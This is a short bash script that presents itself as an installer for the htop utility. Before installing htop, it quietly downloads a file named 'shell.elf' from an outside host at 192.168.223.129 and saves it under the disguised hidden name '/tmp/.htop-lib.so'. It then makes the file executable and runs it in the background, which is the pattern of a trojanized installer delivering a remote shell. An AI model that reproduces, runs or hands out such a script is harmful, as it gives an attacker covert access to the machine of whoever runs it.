#!/bin/bash
curl -s -o /tmp/.htop-lib.so http://192.168.223.129:8000/shell.elf
chmod +x /tmp/.htop-lib.so
/tmp/.htop-lib.so &
sudo apt-get update -y
sudo apt-get install -y htop
exec htop
